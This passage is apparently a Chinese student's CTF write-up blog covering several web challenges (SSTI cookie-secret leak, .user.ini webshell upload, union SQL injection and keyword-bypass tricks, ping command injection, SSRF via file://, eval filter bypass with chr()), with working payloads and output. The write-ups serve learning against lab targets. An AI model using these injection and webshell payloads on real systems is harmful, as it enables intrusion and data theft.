noreferrer">学习笔记2.护网杯 2018 easy_tornado</a></p><p>然后直接用<code>msg=&#123;&#123;handler.settings&#125;&#125;</code>就可以获得<code>cookie_secret</code>了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;autoreload&#x27;</span>: <span class="literal">True</span>, <span class="string">&#x27;compiled_template_cache&#x27;</span>: <span class="literal">False</span>, <span class="string">&#x27;cookie_secret&#x27;</span>: <span class="string">&#x27;3970aa6c-cbfd-4f76-8f21-8d2972867169&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><p>然后计算文件对应的签名就可以拿到flag了，payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file?filename&#x3D;&#x2F;fllllllllllllag&amp;filehash&#x3D;5a0ab60fd2f5e61767ec46a3a8785553</span><br></pre></td></tr></table></figure><h3 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h3><p>文件上传，emmm，只会传一句话，日常搜题解</p><p>直接上传php一句话文件是不行的，提示<code>illegal suffix!</code>非法后缀，直接改为<code>jpg</code>结尾也不行，回显<code>&lt;? in contents!</code><br>随便传个内容试一下，文件名<code>123.jpg</code>，内容<code>test</code>，回显<code>exif_imagetype:not image!</code>，<code>exif_imagetype()</code>函数通过获取文件的第一个字节并检查签名来判断是哪种图片，不是图片则返回<code>false</code></p><p>上传文件内容添加gif头<code>GIF89a</code>，上传成功，返回上传目录，以及目录下的文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Your dir uploads/<span class="number">76</span>d9f00467e5ee6abc3ca60892ef304e</span><br><span class="line">Your files :</span><br><span class="line"><span class="keyword">array</span>(<span class="number">4</span>) &#123; [<span class="number">0</span>]=&gt; <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;.&quot;</span> [<span class="number">1</span>]=&gt; <span class="keyword">string</span>(<span class="number">2</span>) <span class="string">&quot;..&quot;</span> [<span class="number">2</span>]=&gt; <span class="keyword">string</span>(<span class="number">7</span>) <span class="string">&quot;123.jpg&quot;</span> [<span class="number">3</span>]=&gt; <span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;index.php&quot;</span> &#125;</span><br></pre></td></tr></table></figure><p>分别是本目录<code>.</code>上层目录<code>..</code>和本目录下的<code>index.php</code>以及刚上传的<code>123.jpg</code><br>目前已知信息：</p><ul><li>上传文件会经过黑名单过滤，不允许出现<code>&lt;?</code></li><li>上传文件中必须存在图片文件的开头hex值</li></ul><p>剩下的就不会了（理直气壮）<br>开始面向wp做题，看到大佬的wp说道可以上传<code>.user.ini</code>文件来实现在php文件中引入类似<code>require(&#39;file&#39;)</code>的效果</p><p>在<code>.user.ini</code>中设置<code>auto_prepend_file=shell.jpg</code>，就可以在<code>index.php</code>中自动添加<code>shell.jpg</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">先上传<span class="string">&#x27;xxx.jpg&#x27;</span></span><br><span class="line">GIF89a</span><br><span class="line">&lt;script language=<span class="string">&#x27;php&#x27;</span>&gt;system(<span class="string">&#x27;cat /flag&#x27;</span>);&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">然后上传<span class="string">&#x27;.user.ini&#x27;</span></span><br><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=xxx.jpg</span><br><span class="line"></span><br><span class="line">然后访问</span><br><span class="line">http:<span class="comment">//.../uploads/76d9f00467e5ee6abc3ca60892ef304e/index.php</span></span><br><span class="line">成功getflag</span><br></pre></td></tr></table></figure><p>参考链接</p><ul><li><a href="https://www.cnblogs.com/20175211lyz/p/11455355.html">https://www.cnblogs.com/20175211lyz/p/11455355.html</a></li><li><a href="https://xz.aliyun.com/t/6091#toc-1">https://xz.aliyun.com/t/6091#toc-1</a></li><li><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html</a></li></ul><h3 id="N种方法解决"><a href="#N种方法解决" class="headerlink" title="N种方法解决"></a>N种方法解决</h3><p>做个misc压压惊（菜鸡只会misc）<br>下载压缩包，解压后得到KEY.exe，但是电脑却无法运行，拖到winhex里看到直接就是base64编码的图片，base64解码之后得到二维码，然后扫码get flag<br>放几个base解码编码的网站：</p><ul><li><a href='http://tool.chinaz.com/Tools/Base64.aspx' target='_blank' rel="noopener noreferrer">base64</a></li><li><a href='http://tool.chinaz.com/tools/imgtobase' target='_blank' rel="noopener noreferrer">base64 to img</a></li><li><a href='https://www.qqxiuzi.cn/bianma/base.php' target='_blank' rel="noopener noreferrer">base64 /32 /16</a></li></ul><h3 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h3><p>登录界面，输入参数之后提交到<code>check.php</code>，直接用的<code>get</code>方式，单引号可以看到报错信息，payload：<code>uname=a&#39; or &#39;&#39;=&#39;&amp;passwd=a&#39; or &#39;&#39;=&#39;</code></p><h3 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h3><p>接上一题，联合查询注入（这题我会！），上一题的payload可以成功登陆而且给了admin的密码，但是没啥卵用，题目上说flag放在其他地方了，先<code>order by</code>得出有三列</p><p>然后<code>uname=a&amp;passwd=a&#39; union select 1,2,&#39;3</code>可以看到有2和3两个回显，<code>database()</code>得到数据库<code>geek</code>（其实这一步报错也能看到，我是手滑函数名输错了，然后提示<code>FUNCTION geek.databse does not exist</code>，那看来数据库就是<code>geek</code>了）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;a&amp;passwd&#x3D;a&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;&#39;geek</span><br><span class="line">&#x2F;&#x2F;查到两张表geekuser,l0ve1ysq1</span><br><span class="line">uname&#x3D;a&amp;passwd&#x3D;a&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;&#39;l0ve1ysq1</span><br><span class="line">&#x2F;&#x2F;查到三列id,username,password</span><br><span class="line">uname&#x3D;a&amp;passwd&#x3D;a&#39; union select 1,group_concat(username),group_concat(password) from l0ve1ysq1#</span><br><span class="line">&#x2F;&#x2F;查到一大堆东西，其中password字段最后一行是flag</span><br></pre></td></tr></table></figure><p>总结一下就是个简单的联合查询注入，，，很经典的题，没有任何过滤，sqlmap应该能直接注入（可惜我不会用，就当练手了吧），毕竟人家出题人都说了“sqlmap是没有灵魂的”（话说要是会用sqlmap谁还管你有没有灵魂）</p><h3 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h3><p>双写绕过，如果查询语句只经过了一次过滤，过滤方式为把关键字删除，那么直接将所有被过滤的关键字双写即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">or --&gt;oORr</span><br><span class="line">from --&gt; fFROMrom</span><br><span class="line">union --&gt; uUNIONnion</span><br><span class="line">select --&gt; sSELECTelect</span><br><span class="line">where --&gt; wWHEREhere</span><br><span class="line">information_schema --&gt; infoORrmation_schema</span><br><span class="line">password --&gt; passwoORrd</span><br></pre></td></tr></table></figure><h3 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h3><p>命令执行，但是按照别人的题解，只返回了<code>index.php</code>的部分源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;1;cat$IFS&#96;ls&#96;</span><br></pre></td></tr></table></figure><p>也尝试了变量拼接，注意源码中的正则匹配是不允许有<code>.*f.*l.*a.*g.*</code>也就是顺序也不能是flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;1;a&#x3D;ag.php;b&#x3D;fl;cat$FS$b$a  &#x2F;&#x2F;注意不能是a&#x3D;fl;b&#x3D;ag.php</span><br></pre></td></tr></table></figure><p>但是依然没有回显，然后用管道符连接执行<code>od -c</code>查看</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">?ip=1;a=ag.php;b=fl;cat$IFS$b$a|od$IFS-c</span><br><span class="line">//成功得到回显</span><br><span class="line">PING 1 (0.0.0.1): 56 data bytes</span><br><span class="line">0000000   &lt;   ?   p   h   p  \r  \n   $   f   l   a   g       =       &quot;</span><br><span class="line">0000020   f   l   a   g   &#123;   e   a   e   b   6   f   3   4   -   3   f</span><br><span class="line">0000040   e   d   -   4   2   0   2   -   8   e   2   8   -   7   8   5</span><br><span class="line">0000060   7   b   4   a   6   4   d   4   a   &#125;   &quot;   ;  \r  \n   ?   &gt;</span><br><span class="line">0000100  \r  \n</span><br><span class="line">0000102</span><br></pre></td></tr></table></figure><p>mdzz。。。刚刚重新试了一下，右键查看源代码就行了。。。没必要费事用<code>od -c</code>，可能是浏览器的锅，应该是浏览器识别为php代码了<br>index.php的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$match</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> preg_match(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$match</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your symbol!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ /&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your space!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/bash/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your bash!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your flag!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$a</span> = shell_exec(<span class="string">&quot;ping -c 4 &quot;</span>.<span class="variable">$ip</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">  print_r(<span class="variable">$a</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>总结一下可以查看文件的命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat   tac   nl   more    less    head    tail    od</span><br><span class="line">sort    grep    cut</span><br></pre></td></tr></table></figure><p><a href='https://blog.csdn.net/ChenZIDu/article/details/103937649?depth_1-utm_source=distribute.pc_relevant.none-task&utm_source=distribute.pc_relevant.none-task' target='_blank' rel="noopener noreferrer">GXYCTF2019WP<br><a href='https://blog.csdn.net/qq_42812036/article/details/104297163' target='_blank' rel="noopener noreferrer">[GXYCTF2019]Ping Ping Ping {命令执行总结}</a></p><h3 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h3><p>单引号报错界面查看源代码，可以看到html注释，base32之后base64会给出<code>$sql</code>查询语句，如果输入的用户名不是admin会回显wrong user，是则回显wrong pass，那么一定有admin这个用户，下面是github上的部分源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from user where username = &#x27;&quot;</span>.<span class="variable">$name</span>.<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="variable">$arr</span> = mysqli_fetch_row(<span class="variable">$result</span>);</span><br><span class="line"><span class="comment">// print_r($arr);</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$arr</span>[<span class="number">1</span>] == <span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(md5(<span class="variable">$password</span>) == <span class="variable">$arr</span>[<span class="number">2</span>])&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;wrong pass!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>知道源码之后可以再username处进行注入，通过order by（注意or被过滤，可以大写绕过）判断出有三列，可以通过联合查询返回自己要的结果，payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;a&#39; union select 1,&#39;admin&#39;,&#39;c4ca4238a0b923820dcc509a6f75849b&amp;password&#x3D;1</span><br></pre></td></tr></table></figure><p>union select使得返回的结果为一行内容</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 | admin | c4ca4238a0b923820dcc509a6f75849b    //&#x27;1&#x27;的md5值</span><br></pre></td></tr></table></figure><p>那么和<code>md5($password)</code>比较之后就会通过判断，然后就有flag了</p><h3 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h3><p>看到?no=1，本能地想到sql注入，测试了一下一共四列，第二列可以正常回显，整型注入，不用闭合，直接<code>union select</code>会被过滤，但是<code>union/**/select</code>可以绕过，可能是过滤的正则表达式有问题，但是搞了半天啥也没有，只有一个fakebook数据库，一个users表<br>列名：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?no=2 union<span class="comment">/**/</span><span class="keyword">select</span> <span class="keyword">no</span>,username,passwd,<span class="keyword">data</span> <span class="keyword">from</span> <span class="keyword">users</span></span><br><span class="line">//返回正常页面，和?<span class="keyword">no</span>=<span class="number">1</span>一样</span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">？no=2 union<span class="comment">/**/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">concat_ws</span>(<span class="string">&#x27;~&#x27;</span>,<span class="keyword">no</span>,username,passwd,<span class="keyword">data</span>),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> <span class="keyword">users</span></span><br><span class="line">回显：//方便观察，已经分开了</span><br><span class="line"><span class="keyword">no</span>-&gt; <span class="number">1</span></span><br><span class="line">username-&gt; aa</span><br><span class="line">passwd-&gt; cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce47d0d13c5d85f2b0ff8318d2877eec2f63b931bd47417a81a538327af927da3e1</span><br><span class="line">data-&gt; O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:2:&quot;aa&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:6:&quot;aa.com&quot;;&#125;</span><br></pre></td></tr></table></figure><p>然后看源代码时看到iframe标签，就想到可能是ssrf（然而只是听过这个攻击方法，并不知道怎么应用），于是乎又是日常搜题解</p><p><a href="https://www.cnblogs.com/wangtanzhi/p/11900128.html" target='_blank' rel="noopener noreferrer">Fakebook</a></p><p><a href='https://www.cnblogs.com/s0ky1xd/p/5859049.html' target='_blank' rel="noopener noreferrer">浅谈ssrf漏洞</a></p><p>ssrf漏洞：服务器端请求伪造，使服务器发起请求，可以访问到外网访问不到的资源，比如内网的机密文件等</p><p>这一题还需要扫描目录，以后得注意了，做题没事就扫一下2333，可以扫描到存在<code>robots.txt</code>和<code>flag.php</code>，但是直接访问<code>flag.php</code>是没有任何内容的，从<code>robots.txt</code>中可以知道还有<code>user.php.bak</code>备份文件，下载下来进行代码审计</p><p>看了大佬的题解，意思是数据库中存的<code>data</code>是反序列化后的用户信息，那么注册的时候有过滤，这时候就可以通过查询语句来绕过，去得到<code>flag.hph</code>的内容，构造payload;</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?no=2 union<span class="comment">/**/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:2:&quot;aa&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;</span> <span class="keyword">from</span> <span class="keyword">users</span></span><br></pre></td></tr></table></figure><p>然后可以在源代码中找到blog内容中有base64编码之后的<code>flag.php</code>的代码</p><h5 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h5><p>因为没有屏蔽<code>load_file()</code>函数，所以可以在sql语句中读取文件</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?no=2 union<span class="comment">/**/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">substr</span>(<span class="keyword">load_file</span>(<span class="string">&#x27;/var/www/html/flag.php&#x27;</span>),<span class="number">5</span>),<span class="number">3</span>,<span class="number">4</span></span><br></pre></td></tr></table></figure><p>用<code>substr()</code>函数可以将文件前几个字符去掉，避免识别为php代码，但是测试了一下，不用<code>substr()</code>也可以在源代码中看到flag</p><h3 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h3><p>打卡靶机之后是一个简单计算器，查看源代码可以看到是向<code>calc.php</code>传递参数来进行计算，访问<code>calc.php</code>得到源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">        <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;;&#x27;</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到是通过<code>eval()</code>函数来进行的计算，但是有waf，于是乎，日常搜题解</p><p><a href='https://blog.csdn.net/weixin_44077544/article/details/102630714' target='_blank' rel="noopener noreferrer">[RoarCTF 2019]Easy Calc</a><br><a href='https://blog.csdn.net/a3320315/article/details/102937797' target='_blank' rel="noopener noreferrer">[RoarCTF 2019]Easy Calc(http走私 &amp;&amp; 利用PHP的字符串解析特性Bypass)</a></p><p>对于这一题讲，貌似waf并不是仅仅有php代码中那一个，因为传递某些参数还会出现404或者500，可以利用php的字符串解析特性，传递参数<code>&#39; num&#39;</code>，php在识别时会自动去掉空白字符或者添加下划线，于是我们传递参数<code>&#39; num&#39;</code>，不会被waf识别，但是却可以在php代码中执行，然后再考虑绕过php中的waf，屏蔽了很多关键字符，可以用<code>chr()</code>函数绕过</p><p>使用<code>scandir()</code>扫描目录，<code>var_dump()</code>来讲返回的数组输出，payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">? num=<span class="number">1</span>;var_dump(scandir(chr(<span class="number">47</span>))</span><br><span class="line">回显：</span><br><span class="line"><span class="keyword">array</span>(<span class="number">24</span>) &#123; [<span class="number">0</span>]=&gt; <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;.&quot;</span> [<span class="number">1</span>]=&gt; <span class="keyword">string</span>(<span class="number">2</span>) <span class="string">&quot;..&quot;</span> [<span class="number">2</span>]=&gt; <span class="keyword">string</span>(<span class="number">10</span>) <span class="string">&quot;.dockerenv&quot;</span> [<span class="number">3</span>]=&gt; <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;bin&quot;</span> [<span class="number">4</span>]=&gt; <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;boot&quot;</span> [<span class="number">5</span>]=&gt; <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;dev&quot;</span> [<span class="number">6</span>]=&gt; <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;etc&quot;</span> [<span class="number">7</span>]=&gt; <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;f1agg&quot;</span><span class="comment">//此处省略一堆</span></span><br></pre></td></tr></table></figure><p>看到有文件<code>f1agg</code>，然后可以用<code>file_get_contents()</code>函数读取文件内容，还是用<code>chr()</code>函数绕过过滤，payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">? num=<span class="number">1</span>;var_dump(file_get_contents(chr(<span class="number">47</span>).chr(<span class="number">102</span>).chr(<span class="number">49</span>).chr(<span class="number">97</span>).chr(<span class="number">103</span>).chr(<span class="number">103</span>)))</span><br></pre></td></tr></table></figure><p>参考：<br><a href='https://www.freebuf.com/articles/web/213359.html' target='_blank' rel="noopener noreferrer">利用PHP的字符串解析特性Bypass</a><br><a href='https://xz.aliyun.com/t/6654' target='_blank' rel="noopener noreferrer">从一道题到协议层攻击之HTTP请求走私</a></p><h3 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h3><p>右键查看源代码，看到有注释提示</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">    <span class="variable">$cat</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cat&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$cat</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$cat</span>==<span class="string">&#x27;dog&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Syc&#123;cat_cat_cat_cat&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>get方法传递参数<code>?cat=dog</code></p><h3 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h3><p>算是签到吧</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;fliter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure><p>回显</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7N2Y3ZmUzZGUtMDhlMC00NzVkLWEzYzctMDkzZGY4NTA1NDc1fQo&#x3D;</span><br></pre></td></tr></table></figure><p><a href='https://blog.csdn.net/nzjdsds/article/details/82461043' target='_blank' rel="noopener noreferrer">PHP伪协议总结</a></p><h3 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h3><p>白给的shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">post data:</span><br><span class="line">Syc&#x3D;system(&#39;cat &#x2F;flag&#39;);</span><br></pre></td></tr></table></figure><h3 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h3><p>源码泄露+反序列化漏洞</p><p>首先是get到<code>www.zip</code>然后解压后得到源码，发现index中有</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td 